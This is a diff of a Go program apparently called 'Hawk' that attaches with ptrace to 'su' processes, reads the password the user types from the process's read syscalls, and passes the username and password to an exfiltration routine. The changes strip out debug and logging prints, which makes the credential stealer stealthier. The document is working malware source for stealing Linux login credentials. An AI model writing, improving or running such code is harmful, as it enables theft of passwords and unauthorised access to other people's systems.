@@ -9,15 +9,12 @@ import (
 )
 
 func traceSUProcess(pid int) {
-	fmt.Printf("[Hawk] SU Connection Identified on pid: %d.\n", pid)
-
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
 	}
 	defer func() {
 		syscall.PtraceDetach(pid)
-		fmt.Printf("[Hawk] Detached from pid: %d.\n", pid)
 	}()
 	var wstatus syscall.WaitStatus
 	var readSyscallCount int
@@ -35,28 +32,22 @@ func traceSUProcess(pid int) {
 		var regs syscall.PtraceRegs
 		ptrace_err := syscall.PtraceGetRegs(pid, &regs)
 		if ptrace_err != nil {
-			fmt.Println("PtraceGetRegs:", ptrace_err)
 			syscall.PtraceDetach(pid)
 			return
 		}
 		if regs.Orig_rax == 0 && regs.Rdx == 511 && regs.Rdi == 0 {
-			fmt.Println("D1")
 			readSyscallCount++
 			if readSyscallCount == 3 {
-				fmt.Println("D2")
 				buffer := make([]byte, regs.Rdx)
 				_, err := syscall.PtracePeekData(pid, uintptr(regs.Rsi), buffer)
 				if err != nil {
-					fmt.Println("Error reading buffer:", err)
 					return
 				}
-				fmt.Println("D3")
 				if strings.Contains(string(buffer), "\n") {
 					cmdline, err := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
 					if err != nil {
 						return
 					}
-					fmt.Println("D4")
 					username := "root"
 					if len(cmdline) > 3 {
 						username = string((cmdline[3:]))
@@ -70,10 +61,7 @@ func traceSUProcess(pid int) {
 						}
 						return true
 					}(password) {
-						fmt.Printf("Username: %q, Password %q\n", username, password)
 						go exfil_password(username, password)
-					} else {
-						fmt.Printf("bad_string\n")
 					}
 				}
 			}
